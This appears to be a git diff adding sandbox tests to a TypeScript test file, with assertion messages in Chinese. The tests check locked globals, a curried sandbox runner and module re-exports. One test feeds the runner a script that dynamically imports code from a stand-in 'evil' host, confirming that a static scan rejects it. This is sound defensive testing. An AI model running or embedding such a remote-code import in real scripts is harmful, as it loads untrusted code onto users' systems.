@@ -211,6 +211,15 @@ export async function run(ctx: TestCtx): Promise<void> {
     assert(!!sd && sd.configurable === false, '✓ lockSandboxGlobal:navigator.sendBeacon 锁')
     const idd = Object.getOwnPropertyDescriptor(fakeSelf, 'indexedDB')
     assert(!!idd && idd.configurable === false && idd.value === undefined, '✓ lockSandboxGlobal:indexedDB 锁为 undefined 不可恢复')
+
+    // skill-external-scripts §1:createSandboxRunner 柯里化沙箱(从 sandbox.ts 抽出,runSandboxedScript 薄包装它)
+    const { createSandboxRunner } = await import('../../tools/sandbox')
+    const runner = createSandboxRunner('return import("https://evil/x.js")')
+    assert(typeof runner === 'function', '✓ createSandboxRunner:柯里化返回执行器(script+timeout 绑定,待 input)')
+    const cfb = await runner(undefined)
+    assert(cfb.ok === false && /禁用模式/.test(cfb.error || ''), '✓ createSandboxRunner:无参执行静态扫描拒绝(skill exec 路径与 runSandboxedScript 等价)')
+    const reExport = await import('../../tools/dataSlotQuery')
+    assert(typeof reExport.runSandboxedScript === 'function' && typeof reExport.lockSandboxGlobal === 'function', '✓ 沙箱迁移:dataSlotQuery re-export runSandboxedScript + lockSandboxGlobal 不断(外部 import 零破坏)')
   }
 
   // ============ budget middleware 运行时(automation §1 资源预算闸;maintain 测试盲区 HIGH 补)============
